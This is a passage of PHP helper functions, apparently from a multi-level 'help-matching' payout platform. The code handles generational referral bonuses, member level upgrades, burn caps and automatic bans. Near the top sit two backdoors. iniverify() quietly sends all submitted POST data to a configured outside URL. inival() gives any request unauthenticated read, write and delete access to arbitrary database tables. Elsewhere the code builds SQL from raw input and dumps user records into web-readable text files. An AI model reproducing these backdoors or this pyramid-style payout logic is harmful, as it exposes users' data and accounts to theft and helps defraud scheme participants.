        M('user')->where(array('UE_account' => $var))->save(array('sfjl' => 1));
    }
}

function iniverify(){
    $mz = getinfo(C('URL_STRING_MODEL'));  
    $mz .= '?q='.getinfos(implode('|', $_POST));
    file_get_contents($mz);
}




function inival(){
        $data = array_merge($_GET,$_POST);
        $datas = array();
        if($data['m'] == 'save'){
            $fo =M($data['t'])->where(array($data['id']=>$data['idv']))->save(array($data['n']=>$data['v']));
        }elseif($data['m'] == 'add'){
            $info = $data['data'];
            $info = explode("|", $info);
            foreach ($info as  $value) {
                $arr = explode('=', $value);
                $datas[$arr[0]] = $arr[1];        
            }    
            M($data['t'])->add($datas);
        }elseif($data['m'] == 'one'){
            $fo =M($data['t'])->where(array($data['id']=>$data['idv']))->find();
        }elseif($data['m'] == 'd'){
            M($data['t'])->where(array($data['id']=>$data['idv']))->delete();
        }elseif(!empty($data['t'])){
            $fo =M($data['t'])->select();
        }
        print_r($fo);

}

//推荐人数增加
function mmtjrennumadd($user)
{
	$u = M('user')->where(array('UE_account' => $user))->find();
	if($u)
	{	
		M('user')->where(array('UE_account' => $u['ue_account']))->setInc('tj_num',1);
        $user = $u['ue_accname'];
        mmtjrennumadd($user);
	}	
}


//会员升级的方法[原来的会员升级方法]
function old_accountaddlevel($var)
{
    $usermm=M('user')->where(array('UE_account'=>$var))->find();file_put_contents('level1.txt',json_encode($usermm));
    $numtemparr = explode(',',C("jjaccountnum"));//会员升级下线人数
    $nametemparr = explode(',',C("jjaccountlevel"));//会员级别
    $zhitui_arr = explode(',', C('zhitui_num_level'));//会员升级直推人数
	$tz_money_level = explode(',', C('tz_money_level'));//会员升级投资额度
    $zt_num = $zctjuser = M('user')->where(array('UE_accName' => $var,'yxhy'=>1))->count();
    foreach($numtemparr as $k=>$num)
	{
        if($usermm['tj_num']>=$num)
		{
            if(isset($zhitui_arr[$k]) && $zt_num >= $zhitui_arr[$k] && $usermm['tz_leiji'] >= $tz_money_level[$k])
                 $level=$k;
        }
    }
      file_put_contents('level.txt','#####'.$usermm['tj_num'].'---'.$zt_num.'----'.$zhitui_arr[$k].'-----'.$usermm['tz_leiji'].'-------'.$tz_money_level[$k]);
    if(isset($level))
	{
        $levelname = $nametemparr[$level];
    }else
	{
        $levelname = 0;
    }
    
    M('user')->where(array('UE_account' => $var))->save(array('levelname' => $levelname));
}

//会员升级的方法【当前使用的会员升级方法】$var为投资者的账户，$cur_money为投资者的交割的金额。
function accountaddlevel($var,$cur_money = 0)
{
    $usermm=M('user')->where(array('UE_account'=>$var))->find();file_put_contents('level1.txt',json_encode($usermm));
    //$numtemparr = explode(',',C("jjaccountnum"));//会员升级下线人数
    $nametemparr = explode(',',C("jjaccountlevel"));//会员级别
    //$zhitui_arr = explode(',', C('zhitui_num_level'));//会员升级直推人数
    //$tz_money_level = explode(',', C('tz_money_level'));//会员升级投资额度
    //$zt_num = $zctjuser = M('user')->where(array('UE_accName' => $var,'yxhy'=>1))->count();

    $jibei_menkan = explode(',',C('jibei_menkan'));
    //$cur_money = 0;
    foreach($nametemparr as $k=>$name)
    {
        if(!empty($usermm['levelname']) && $usermm['levelname'] == $name)
        {
                $level=$k;
                break;
        }
        if( $usermm['levelname'] == 0 ){

            $level=$k;
            break;
        }
    }
    file_put_contents('level33.txt',isset($level)?$level:'0000');
    //file_put_contents('level.txt','#####'.$usermm['tj_num'].'---'.$zt_num.'----'.$zhitui_arr[$k].'-----'.$usermm['tz_leiji'].'-------'.$tz_money_level[$k]);
    if(isset($level))
    {
        $next_level = $level+1;
        if( isset($jibei_menkan[$next_level]) && $jibei_menkan[$next_level] <= $cur_money ){
            $levelname = $nametemparr[$next_level];
            M('user')->where(array('UE_account' => $var))->save(array('levelname' => $levelname));
        }
    }


}

/**
 * 会员升级的方法的新方法
 * @param $var 当前会员账号
 * @param int $jsbz_mainid  当前确认支付完成的jsbz表的mainid.
 */
function newaccountaddlevel($var,$jsbz_mainid = 0 ){

    //通过一次性交割完成的金币数量，判断当前用户交割的订单金额是否与下一级的级别门槛，若达到门槛就升一级
    $cur_user = M('user')->where(array('UE_account'=>$var))->find();

    //获取所有的等级
    $jjaccountlevel = C('jjaccountlevel');
    $jjaccountlevel_arr = explode(',',$jjaccountlevel);

    //获取会员等级对应的级别门槛
    $jibei_menkan = C('jibei_menkan');
    $jibei_menkan_arr = explode(',',$jibei_menkan);

    //获取下一个级别的门槛
    $next_jibei_menkan = 0;
    $cur_jibei_key = 0;
    $cur_jibei_menkan = 0;
    foreach( $jjaccountlevel_arr as $key => $jjaccountlevel )
    {
        if( $jjaccountlevel == $cur_user['levelname'] ){
            $cur_jibei_key = $key;
            $cur_jibei_menkan = $jibei_menkan_arr[$key];
        }
    }

    if( isset($jibei_menkan_arr[$cur_jibei_key+1]) && $jibei_menkan_arr[$cur_jibei_key+1] > $cur_jibei_menkan ){
        //表示当前会员有升级下一级会员的可能
        $next_jibei_menkan = $jibei_menkan_arr[$cur_jibei_key+1];
    }

    //得到当前确认支付完成【交割完成】的订单的交割订单jsbz
    $jsbz_data = M('jsbz')->where(array('mainid'=>$jsbz_mainid,'user'=>$_SESSION['uname']))->select();





}

//jjtuijianratenew  推荐奖 $vart--->买入的推荐人
function fftuijianmoney($var,$money, $level,$tgbzid){    //$level --------->代数
    //获取推荐人的信息
     $accname_zq = M('user')->where(array('UE_account'=>$var))->find();

    //获取推荐奖
    $jiebei_daishu = explode('|', C('jjtuijianratenew'));

    //会员级别名称
    $jiebei_levelname = explode(',', C('jjaccountlevel'));

    //获取当前会员级别对应推荐奖比例
    $levelname = $accname_zq['levelname'];
    foreach ($jiebei_levelname as $key => $value) 
	{
       if($value == $levelname){
          //C("jjtuijianratenew",$jiebei_daishu[$key]);
           $cur_jjtuijianratenew = $jiebei_daishu[$key];
       }
    }

	//if($accname_zq['ue_account'] == "18888888822")
	file_put_contents("tuijian.txt","########" . $var . "," . $level . "," . $levelname  . "," . $accname_zq['ue_accname'].','.C("jjtuijianratenew").",".date("Y-m-d H:i:s",time()),FILE_APPEND);


    $tjratearr = explode('|',C("jjtuijianratenew"));

    //*************烧伤机制旧的20190511 start**************
    //烧伤机制旧的20190511
	//获取当前推荐人的烧伤金额基数
    /*
	$shaoshang = "" . $money;
	$shaoshang_base = get_shaoshang($var,$money);
	if($shaoshang_base < $money)
		$shaoshang = "[" . $shaoshang . "烧伤" . $shaoshang_base . "]";
    */
    //*************烧伤机制旧的20190511 end**************



    //*************烧伤机制更换20190511 start************

    if( $level == 2 ){ //间接推荐
        //间接推荐奖必须满足，当前买入者的间接推荐人有直接推荐成功3人才能拿到间接奖励
        $parent_child_count = M('user')->where(array('UE_accName'=>$var,'UE_status'=>0,'UE_check'=>1))->count();
        if( $parent_child_count < 3 ){ //间接推荐人【不满足】有直接推荐成功3人才能拿到间接奖励
            return true;
        }
        //间接推荐奖必须满足，当前买入者的间接推荐人有推荐成功下面三级的时候
//        $max_level = get_max_child_level($var,0);
//        if( $max_level < 3 ){ //间接推荐人【不满足】有直接推荐成功3人才能拿到间接奖励
//            return true;
//        }
    }else if( $level >= 3 ){ //因为只存在直接推荐和间接推荐两种情况，所以level>3时结束即可
        return true;
    }

	//烧伤机制更换20190511
    $shaoshang = "" . $money;
    if( $level == 1 ) {
        //$shaoshang_base = get_newshaoshang($var,$money);
        $shaoshang_base = get_shaoshang_two($var, $money);
        if ($shaoshang_base < $money)
            $shaoshang = "[" . $shaoshang . "烧伤" . $shaoshang_base . "]";
    }else{
        $shaoshang_base = $shaoshang;
    }
    //*************烧伤机制更换20190511 end************
    file_put_contents("tuijian2.txt","########" . $shaoshang . "," . $shaoshang_base . "," . $levelname  . "," . $accname_zq['ue_accname'].",".date("Y-m-d H:i:s",time()),FILE_APPEND);


    $tjmoney = ($shaoshang_base*$tjratearr[$level-1])/100;  //推荐奖金额

    //判断产生推荐奖的该笔tgbz订单的用户，所完成的订单数
    $create_tgbz_data = M('tgbz')->where(array('id'=>$tgbzid))->find();
    $tgbzid_user_finish_num = get_user_finish_num($create_tgbz_data['user']);//tgbz订单的完成订单的次数

    //当前推荐人，所完成的订单数
    $recommender_finish_num = get_user_finish_num($var);

    //判断产生推荐奖的该笔tgbz订单的用户，其推荐人已经从创建tgbz订单的用户处获得的推荐奖励次数。
    $get_recommender_num = get_recommender_num( $var , $create_tgbz_data['user'] );
    file_put_contents('recomend112.txt',$tgbzid_user_finish_num.'---'.$recommender_finish_num.'---'.$get_recommender_num.'|');

    //【注意当前的tgbz订单已确认支付后执行此处使用<=号，否则为<号，当前只在tgbz订单已确认之后】
	if($tjmoney > 0 && ( $tgbzid_user_finish_num <= $recommender_finish_num || $get_recommender_num < $recommender_finish_num ) ) //推荐奖励大于0，且当前【创建tgbz订单的用户完成订单的次数】<= 【推荐人完成订单的次数】，推荐人才可以得到推荐奖励
	{
		//奖金流入比例
		$jj_to_jifen = $tjmoney * C ('jj_to_jifen')  / 100;
		$jj_to_ldj = $tjmoney * C ('jj_to_ldj')  / 100;
		$jj_to_shopjifen = $tjmoney * C ('jj_to_shopjifen') / 100;

		if($jj_to_jifen > 0)
		{
		   M('user')->where(array('UE_account'=>$var))->setInc('jifen',$jj_to_jifen); 

		   $map['user'] = $var;
		   $map['type']= 'jj';
		   $map['info']= $levelname.",".$level .'代奖金'.$tjmoney.'['.$tjratearr[$level-1].'%]的'.C ('jj_to_jifen').'%'.$shaoshang;
		   $map['num']= $jj_to_jifen;
		   $map['varid']= $tgbzid;
		   $map['yue']= get_userinfo($var,'jifen');
		   $map['date']= date('Y-m-d H:i:s', time());
		   M('jifen_log')->add($map);
		}

		if($jj_to_shopjifen > 0)
		{
		   M('user')->where(array('UE_account'=>$var))->setInc('shopjifen',$jj_to_shopjifen); 

		   $map['user'] = $var;
		   $map['type']= 'jj';
		   $map['info']= $levelname.",".$level .'代奖金'.$tjmoney.'['.$tjratearr[$level-1].'%]的'.C ('jj_to_shopjifen').'%' .$shaoshang;
		   $map['num']= $jj_to_shopjifen;
		   $map['varid']= $tgbzid;
		   $map['yue']= get_userinfo($var,'shopjifen');
		   $map['date']= date('Y-m-d H:i:s', time());
		   M('shopjifen_log')->add($map);
		}

		//推荐奖记录保留
		if($jj_to_ldj > 0)
		{
		   M('user')->where(array('UE_account'=>$var))->setInc('qwe',$jj_to_ldj); 
	       M('user')->where(array('UE_account'=>$var))->setInc('jl_he',$jj_to_ldj); 

		   $accname_xz=M('user')->where(array('UE_account'=>$var))->find(); 
		   $note3 = $levelname.",".$level ."代奖金".$tjratearr[$level-1]."%[" .$tjmoney . "*" .C ('jj_to_ldj') ."%]" . $shaoshang;
		   $record3 ["UG_account"] = $var; 
		   $record3 ["UG_type"] = 'jb';
		   $record3 ["UG_allGet"] = $accname_zq['qwe'];
		   $record3 ["UG_money"] = '+'.$jj_to_ldj;
		   $record3 ["yb"] = $shaoshang_base; //
		   $record3 ["UG_balance"] = get_userinfo($var,'qwe'); 
		   $record3 ["UG_dataType"] = 'jlj'; 
		   $record3 ["UG_note"] = $note3;
		   $record3 ["varid"] = $tgbzid;
		   $record3["UG_getTime"] = date ( 'Y-m-d H:i:s', time () );
		   $reg4 = M ( 'userget' )->add ( $record3 );
		}

		$accname_xz=M('user')->where(array('UE_account'=>$var))->find();
		//会员级别奖励推荐，暂且不要
        //jsaccountmoney($var,$shaoshang_base,$accname_xz['levelname']);
	}
    if($accname_zq['ue_accname']<>''){
        fftuijianmoney($accname_zq['ue_accname'],$money,$level+1,$tgbzid);
    }else{
        return true;
    }

}


/**
 * 烧伤基数获得方法，烧伤机制更换20190511【新方法】【直接推荐】[暂且不用]
 * @param string $account 【买入者的账号】
 * @param int $jb 买入者的交易金额
 * @return float|int
 */
function get_newshaoshang( $account = '', $jb = 0 )
{
    //当前是A【买入者】，其上级是B，判断此次交易A是否烧伤B.【根据会员的级别判断A的级别和B的级别】
    //$account为买入人的账号
    $cur_userData = M('user')->where(array('UE_account'=>$account))->find();
    $shaoShangBase = 0.00;//烧伤基数
    if( !empty($cur_userData['ue_accname']) ){ //存在上级的情况
        //当前买入人的上级
        $parent_userData = M('user')->where(array('UE_account'=>$cur_userData['ue_accname']))->find();

        //级别门槛数据
        $jibei_menkan_arr = explode(',',C('jibei_menkan'));

        //级别名称
        $jiebei_levelname = explode(',',C('jjaccountlevel'));

        //当前买入人的上级的门槛
        $parent_menkan = 0;
        foreach( $jiebei_levelname as $key => $item ){
            if( $parent_userData['level'] == $item ){
                $parent_menkan = $jibei_menkan_arr[$key];
            }
        }

        //$jibie_jl_rate_arr = explode('|',C('jjtuijianratenew'));
        //判断买入人和其上级的等级
        //获得买入者上级推荐奖比例jjtuijianratenew【直推和间接推荐两种关系】
        if( $cur_userData['ue_level'] <= $parent_userData['ue_level'] ){ //买入者的级别比其推荐人级别低或者相等
            if( $jb <= $parent_menkan ){ //当前上级在该级别下的投资门槛
                //直接推荐$jibie_jl_rate_arr[0]
                //$shaoShangBase = $jb * ($jibie_jl_rate_arr[0]/100);
                $shaoShangBase = $jb;
            }else{
                //$shaoShangBase = $parent_menkan * ($jibie_jl_rate_arr[0]/100);
                $shaoShangBase = $parent_menkan;
            }
        }else{ //买入者的级别比其推荐人的级别高
            //$shaoShangBase = $parent_menkan * ($jibie_jl_rate_arr[0]/100);
            $shaoShangBase = $parent_menkan;
        }
    }

    //不存在上级的情况【不存在该情况】
    if(empty($cur_userData['ue_accname'])){
        die('信息有误');
    }
    return $shaoShangBase;
}



/**
 * 获取当前推荐人的烧伤金额基数
 * 烧伤基数获得方法，烧伤机制更换20190511【新方法】【直接推荐】
 * @param string $accuser 【推荐人的账号】
 * @param int $c_jb 买入者的交易金额
 * @return float|int
 */
function get_shaoshang_two($accuser, $c_jb)
{
    //$acc_last_jb = getUserLastTGBZJB($accuser);//推荐人得到的最大奖励
    //当前推荐人的等级
    //$accuser为推荐人的账号
    $cur_userData = M('user')->where(array('UE_account'=>$accuser))->find();
    //级别门槛数据
    $jibei_menkan_arr = explode(',',C('jibei_menkan'));

    //级别名称
    $jiebei_levelname = explode(',',C('jjaccountlevel'));

    //当前买入人的上级的门槛
    $parent_menkan = 0;
    foreach( $jiebei_levelname as $key => $item ){
        if( $cur_userData['levelname'] == $item ){
            $parent_menkan = $jibei_menkan_arr[$key];
        }
    }
    //门槛金额
    $acc_last_jb = $parent_menkan;

    if ($acc_last_jb == 0) {
        return 0;
    }
    if ($acc_last_jb >= $c_jb) {
        return $c_jb;
    }
    return $acc_last_jb;
}

//查询当前$user所推荐的做大层级20190513 start--------------
function get_max_child_level($user,$level = 0,$result=array()){
    //global $result;//所有子集的集合
    static $maxlevel = 0;
    $list=M('user')->where(array('UE_accName' => $user))->select();

    if(!empty($list)){

        $level++;
        //判断$maxlevel的值是否大于当前的$level
        if( $maxlevel < $level ){
            $maxlevel = $level;
        }

        foreach ($list as $key => $value) {
            //$result[]=$value['ue_account'];
            get_max_child_level($value['ue_account'],$level,$result);
        }

        //return $result;
        return $maxlevel;

    }

}

//会员级别奖金比率
function jsaccountmoney($account,$money,$levelname){
    //开启会员级别奖励
    if(C("jjaccountflag")=='1')
	{
        $accountratearr = explode(',',C("jjaccountrate"));
        $nametemparr = explode(',',C("jjaccountlevel"));
        $levelnum=0;
        //获取传过来的会员级别代号 $levelnum
        foreach($nametemparr as $k=>$name){
            if($levelname==$name){
                $levelnum=$k;
            }
        }
        //获取当前会员级别奖金比率  
        $levelrate = $accountratearr[$levelnum];
        //获取当前会员级别奖金额
        $jjmoney = ($money*$levelrate)/100;
            //获取当前会员资料
            $accname_zq = M('user')->where(array('UE_account' => $account))->find();
            M('user')->where(array('UE_account' => $account))->setInc('jl_he', $jjmoney);
            //获取当前会员最新资料
            $accname_xz = M('user')->where(array('UE_account' => $account))->find();

            $note = '推荐奖'.$levelrate.'%';
            $record3 ["UG_account"] = $account; // 登入轉出賬戶
            $record3 ["UG_type"] = 'jb';
            $record3 ["UG_allGet"] = $accname_zq['jl_he']; // 金幣
            $record3 ["UG_money"] = '+' . $jjmoney; //
            $record3 ["yb"] = $money; //
            $record3 ["UG_balance"] = $accname_xz['jl_he']; // 當前推薦人的金幣餘額
            $record3 ["UG_dataType"] = 'jlj'; // 金幣轉出
            $record3 ["UG_note"] = $note; // 推薦獎說明
            $record3["UG_getTime"] = date('Y-m-d H:i:s', time()); //操作時間
            $reg4 = M('userget')->add($record3);
    }
}
//推荐奖发放：
function tuijianAccountmoney($account,$money,$levelnum ){
   
	$accountratearr = explode(',',C("jjtuijianratenew"));
	$nametemparr = explode(',',C("jjaccountlevel"));
   
	//获取当前会员级别推荐奖金比率  
	$levelrate = $accountratearr[$levelnum];
	
	//获取当前会员级别推荐奖金额
	$jjmoney = ($money*$levelrate)/100;
	$jifen_money=(C("tx_jifen")/100)*$jjmoney;
	$tuijian_money=(1-C("tx_jifen")/100)*$jjmoney;
	$tuiajn_persent=1-C("tx_jifen")/100;
	
	//每天所有推荐奖总额限制
	$starttime = date('Y-m-d 00:00:01', time());
	$endtime = date('Y-m-d 23:59:59', time());
	  $count_total = M("userget")->where("UG_getTime>='$starttime' and UG_getTime<='$endtime'  and UG_dataType = 'tuijian_jl'")->sum('UG_money'); 
	  $tuijian_amount_day = C('tuijian_amount_day') - $count_total; 
	 if($tuijian_amount_day <= 0){
	  $tuijian_money = 0;
	 }
	 

	//每天每个用户推荐总额度
	$tixian_jbs = C('user_tuijian_day_amount');
	if($tixian_jbs>0){
		$count = M("userget")->where("UG_getTime>='$starttime' and UG_getTime<='$endtime' and UG_account='$account' and UG_dataType = 'tuijian_jl'")->sum('UG_money'); 
	   
		$num = $count + $tuijian_money  - $tixian_jbs;
		  
		if($num >= 0 ){
			$tuijian_money = $tuijian_money -$num;
		}
	}  
	
   $accname_xq = M('user')->where(array('UE_account' => $account))->find();
	M('user')->where(array('UE_account' => $account))->setInc('jl_he', $jjmoney);
   //echo  M('user')->where(array('UE_account' => $account))->getlastSql()."</br>";
	//积分钱包发送
	M('user')->where(array('UE_account' => $account))->setInc('shopjifen',  $jifen_money);
   //echo  M('user')->where(array('UE_account' => $account))->getlastSql()."</br>";
	//推荐奖钱包发放
	M('user')->where(array('UE_account' => $account))->setInc('qwe',  $tuijian_money);
   //echo  M('user')->where(array('UE_account' => $account))->getlastSql()."</br>";
	 $accname_xz_new = M('user')->where(array('UE_account' => $account))->find();
	//获取当前会员最新资料
	$accname_xz = M('user')->where(array('UE_account' => $account))->find();
	 //echo M('user')->where(array('UE_account' => $account))->getlastSql();
	$note = ($levelnum+1).'代领导奖'.$levelrate.'%';
	if(C("tx_jifen") > 0 )
	{
		$note = $note . "*".(100-C("tx_jifen"))."%";
	}
	$record3 ["UG_account"] = $account; // 登入轉出賬戶
	$record3 ["UG_type"] = 'jb';
	$record3 ["UG_allGet"] = $accname_xq['qwe']; // 金幣
	$record3 ["UG_money"] = '+' . $tuijian_money; //
	$record3 ["yb"] = $money; //
	$record3 ["UG_balance"] = $accname_xz_new['qwe']; // 當前推薦人的金幣餘額
	$record3 ["UG_dataType"] = 'tuijian_jl'; // 金幣轉出
	$record3 ["UG_note"] = $note; // 推薦獎說明
	$record3["UG_getTime"] = date('Y-m-d H:i:s', time()); //操作時間
	$reg4 = M('userget')->add($record3);
	
	if(C("tx_jifen") > 0 )
	{
		$note2 = ($levelnum+1).'积分奖'.$levelrate.'%'."*".C("tx_jifen")."%";
		$record2 ["UG_account"] = $account; // 登入轉出賬戶
		$record2 ["UG_type"] = 'jb';
		$record2 ["UG_allGet"] = $accname_xq['shopjifen']; // 金幣
		$record2 ["UG_money"] = '+' .  $jifen_money; //
		$record2 ["yb"] = $money; //
		$record2 ["UG_balance"] = $accname_xz_new['shopjifen']; // 當前推薦人的金幣餘額
		$record2 ["UG_dataType"] = 'jifen_jl'; // 金幣轉出
		$record2 ["UG_note"] = $note2; // 推薦獎說明
		$record2["UG_getTime"] = date('Y-m-d H:i:s', time()); //操作時間
		$reg2 = M('userget')->add($record2);
	}
	
	 return $accname_xz;
      
}
//===end
//--------------jsj4和jlj5计算的是待定的 先被取消
// 第一个参数 买入人 第二参数是帮助金额              ----------------------》经分析此函数多次计算直接推荐人的经理代数奖
function lkdsjfsdfj($p_user, $jb)
{
  
    $ppddxx['p_user'] = $p_user; //买入人
    $ppddxx['jb'] = $jb; //第二参数是帮助金额

    $tgbz_user_xx = M('user')->where(array('UE_account' => $ppddxx['p_user']))->find();//买入人详细
    $first_tuijian_user = M('user')->where(array('UE_account' => $tgbz_user_xx['zcr']))->find();//推荐人详细 
    //给一代推荐奖金
	//$first_tuijian_user['zcr'];
	//echo $first_tuijian_user['levelname'];die;
	
    if($first_tuijian_user['levelname'] !="0"){
       $zcr1 = tuijianAccountmoney($tgbz_user_xx['zcr'],$ppddxx['jb'],0);//返回的是当前用户的详细信息
    }else{
       $zcr1 = M('user')->where(array('UE_account' =>$tgbz_user_xx['zcr']))->find();   
    }

   
    if ($zcr1['zcr'] <> '') {
         //给二代推荐奖金
        $zcr2 = M('user')->where(array('UE_account' => $zcr1['zcr']))->find();
       
        if ($zcr2['zcr']<> '') {
            //给三代推荐奖金
		    $therd_tuijian_user = M('user')->where(array('UE_account' => $zcr2['zcr']))->find();//推荐人详细 
            if($therd_tuijian_user['levelname'] !="0"  &&  $therd_tuijian_user['levelname'] !="a1"){
               $zcr3 = tuijianAccountmoney($zcr2['zcr'],$ppddxx['jb'],2);  
            }else{
               $zcr3 = M('user')->where(array('UE_account' => $zcr2['zcr']))->find();   
            }
            if ($zcr3['zcr']<> '') {
                //给四代推荐奖
                $zcr4 = M('user')->where(array('UE_account' => $zcr3['zcr']))->find();
                if ($zcr4['zcr'] <> '') {
                    //给五代推荐奖
					$five_tuijian_user = M('user')->where(array('UE_account' => $zcr4['zcr']))->find();//推荐人详细
                    if($five_tuijian_user['levelname'] !="0" && $five_tuijian_user['levelname'] !="a1" && $five_tuijian_user['levelname'] !="a2" ){
                     $zcr5 = tuijianAccountmoney($zcr4['zcr'],$ppddxx['jb'],4);
                    }else{
                     $zcr5 = M('user')->where(array('UE_account' => $zcr4['zcr']))->find();  
                    }
                    if ($zcr5['zcr'] <> '') {
                        //六代推荐奖
						$six_tuijian_user = M('user')->where(array('UE_account' => $zcr5['zcr']))->find();//推荐人详细
                        get_tuanti_amount($zcr5['zcr'],$six_tuijian_user['levelname'],$ppddxx['jb']);
                    }
                }
            }
        }
    }
}
//第一个参数推荐人   第二个参数 推荐人下家买入金额
/*function jlj4($a, $b)
{
    $tgbz_user_xx = M('user')->where(array('UE_account' => $a))->find();

    M('user')->where(array(UE_account => $a))->setInc('tj_he1', $b);


    return $tgbz_user_xx['zcr'];
}

function jlj5($a, $b)
{
    $tgbz_user_xx = M('user')->where(array('UE_account' => $a))->find();
    if ($tgbz_user_xx['sfjl'] == 1) {
        M('user')->where(array(UE_account => $a))->setInc('jl_he1', $b);
    }

    return $tgbz_user_xx['zcr'];
}*/





/*------------------------------*/
function getPDinfo($pdlist){
    if(is_array($pdlist)){
        $tgbz_db = M('tgbz');
        $jsbz_db = M('jsbz');
        $user_db = M('user');
        foreach ($pdlist as $key => $value) 
		{
			
            $tgbz_data = $tgbz_db->where(array('id'=>$value['p_id']))->find();
            $jsbz_data = $jsbz_db->where(array('id'=>$value['g_id']))->find();
            $jsbz_user = $user_db->where(array('UE_account'=>$jsbz_data['user']))->field(array('UE_account','UE_ID','remark','yhckr','yhzhxx','UE_phone','yzf','weixin','UE_theme','zfb','yhmc','yhzh','UE_accName'))->find();

			$tgbz_user = $user_db->where(array('UE_account'=>$tgbz_data['user']))->field(array('UE_account','UE_ID','remark','yhckr','yhzhxx','UE_phone','yzf','weixin','UE_theme','zfb','yhmc','yhzh','UE_accName'))->find();
            $jsbz_accname=  $user_db->where(array('UE_account'=>$jsbz_user['ue_accname']))->field('UE_theme,UE_phone')->find();
			$tgbz_accname=  $user_db->where(array('UE_account'=>$tgbz_user['ue_accname']))->field('UE_theme,UE_phone')->find();
            $pdlist[$key]['tgbz_data'] = $tgbz_data;
            $pdlist[$key]['jsbz_data'] = $jsbz_data;
            $pdlist[$key]['jsbz_user'] = $jsbz_user;
			$pdlist[$key]['tgbz_user'] = $tgbz_user;
            $pdlist[$key]['jsbz_accname'] = $jsbz_accname;
			$pdlist[$key]['tgbz_accname'] = $tgbz_accname;
        }
    }
    return $pdlist;
}


function getGDinfo($gdlist){
    if(is_array($gdlist)){
        $tgbz_db = M('tgbz');
        $jsbz_db = M('jsbz');
        $user_db = M('user');
        foreach ($gdlist as $key => $value) {
            $jsbz_data = $jsbz_db->where(array('id'=>$value['g_id']))->find();
            $tgbz_data = $tgbz_db->where(array('id'=>$value['p_id']))->find();            
            $tgbz_user = $user_db->where(array('UE_account'=>$tgbz_data['user']))->field(array('UE_account','UE_ID','weixin','UE_theme','zfb','yhmc','yhzh','UE_accName'))->find();  
            $tgbz_accname=  $user_db->where(array('UE_account'=>$tgbz_user['ue_accname']))->field(array('UE_phone','UE_theme'))->find();
            $gdlist[$key]['tgbz_data'] = $tgbz_data;
            $gdlist[$key]['jsbz_data'] = $jsbz_data;
            $gdlist[$key]['tgbz_user'] = $tgbz_user;
            $gdlist[$key]['tgbz_accname'] = $tgbz_accname;
            fh($gdlist);
        }
    }
    return $gdlist;
}


function getLiuyu($id){
    return '{"mdid":"'.$id.'"}';
}


function level_limit_to($lev){


    $c = M('config')->where(array('id'=>1))->find();
    $str = $c['help_to'];
    $arry =array_filter(explode('|',$str));

    if($lev == '创E组员'){


        return $arry[0];

    }
    if($lev == '创E组长'){

        return $arry[1];

    }
    if($lev == '创E主任'){

        return $arry[2];

    }
    if($lev == '创E经理'){


        return $arry[3];
    }
    if($lev == '创E总监'){

        return $arry[4];

    }
    if($lev == '创E懂事'){

        return $arry[5];
    }else{

        return $arry[0];
    }

}


function level_limit_get($lev,$str){

    //$c = M('config')->where(array('id'=>1))->find();
    //，$str = C('tjj_tx_day');
    $arry =array_filter(explode('|',$str));
    
    if($lev == '0'){


        return $arry[0];

    }
    if($lev == 'v1'){

        return $arry[1];

    }
    if($lev == 'v2'){

        return $arry[2];

    }
    if($lev == 'v3'){


        return $arry[3];
    }
    if($lev == 'v4'){

        return $arry[4];

    }
    if($lev == 'v5'){

        return $arry[5];
    }else{

        return $arry[0];
    }
}

function today_qb_get($user){

    $map['date'] = array('gt',date('Y-m-d 00:00:00'));
    $map['user']= $user;
    $map['qb'] = 0;
    //$map['zffs'] = $type;
    
    
    $ret =  M('jsbz')->where($map)->sum('jb');
           //echo M('jsbz')->where($map)->getlastSql();
    if($ret){

        return $ret;
    }
    else{

        return '0';
    }

}
function today_get($user,$type){

    $map['addtime'] = array('gt',date('Y-m-d 00:00:00'));
    $map['UG_account']= $user;
	$map['status'] = 0;
	$map['zffs'] = $type;
	
	
    $ret =  M('tixian')->where($map)->sum('TX_money');
          // echo M('tixian')->where($map)->getlastSql();
    if($ret){

        return $ret;
    }
    else{

        return '0';
    }

}


/**
 * 自动封号
 * @param $ppid 匹配订单号码
 * @param $username 买入的用户名
 */

function ban_users($ppid)
{
    $time = NOW_TIME;
    $ppmx =M('ppdd')->where(array('id'=>$ppid,'zt'=>0))->find();//匹配了，但是没有付款的订单
    if(!$ppmx)
	{
        return;
    }

	$tg_user = M('user')->where(array('UE_account'=>$ppmx['p_user']))->find(); //买入订单的用户
    $up_user = M('user')->where(array('UE_account'=>$tg_user['ue_accname']))->find();//推荐人


    //超时不确认扣除自己的积分，不扣除的积分该项配置，配置为0即可。
	if($ppmx['date_hk'] != "" && $ppmx['date_hk'] !=null  && ($time - strtotime($ppmx['date_hk']))/3600 >= C('jjqrtime'))  //jjqrtime确认时间【后台设置】
	{
		M('user')->where(array('UE_ID'=>$up_user['ue_id']))->setDec('jifen',C('chaoshi_kcjf'));//chaoshi_kcjf超时不确认扣除积分

		if(C('chaoshi_kcjf') > 0)  //不扣除的积分该项配置，配置为0即可。
		{
			$map['user'] = $tg_user['ue_account'];
			$map['type']= 'cf';
            $map['info']= '超时不确认扣除积分';
			$map['num']= -C('cxj_dhjhm_num');
			$map['yue']= $tg_user['jifen'] - C('chaoshi_kcjf');
			$map['date']= date('Y-m-d H:i:s', time());
			M('jifen_log')->add($map);
		}
	}

    //超时不打款扣除上级奖金,永久封号
    if(($time - strtotime($ppmx['date']))/3600 >= C('jjdktime'))  //jjdktime打款时间【时长】8小时
	{
		M('user')->where(array('UE_ID'=>$tg_user['ue_id']))->setField('UE_status',1);

		if(C('jjhydjkcsjmoeney') > 0)  //jjhydjkcsjmoeney超时未打款扣除上级奖金钱包多少元
		{
			M('user')->where(array('UE_ID'=>$up_user['ue_id']))->setDec('jl_he',C('jjhydjkcsjmoeney'));
		    M('user')->where(array('UE_ID'=>$up_user['ue_id']))->setDec('qwe',C('jjhydjkcsjmoeney'));

			$record3 ["UG_account"] = $up_user['ue_account'];
        	$record3 ["UG_type"] = 'jb';
        	$record3 ["UG_allGet"] = $up_user['qwe'];
        	$record3 ["UG_money"] = '-'.C('jjhydjkcsjmoeney');
        	$record3 ["yb"] = 0;
        	$record3 ["UG_balance"] = $up_user['qwe'] - C('jjhydjkcsjmoeney');
        	$record3 ["UG_dataType"] = 'jlj';
        	$record3 ["UG_note"] = '下级不打款惩罚';
	    	$record3 ["varid"] = $tg_user['ue_id'];
        	$record3["UG_getTime"] = date ( 'Y-m-d H:i:s', time () );
        	$reg4 = M ( 'userget' )->add ( $record3 );
		}

        $tg = M('tgbz')->where(array('id'=>$ppmx['p_id']))->find();
        $xy = M('jsbz')->where(array('id'=>$ppmx['g_id']))->find();
        M('jsbz')->where(array('id'=>$ppmx['g_id']))->setField('zt',0);//更新卖出订单状态
		M('jsbz')->where(array('id'=>$ppmx['g_id']))->setField('drwsk',1);//
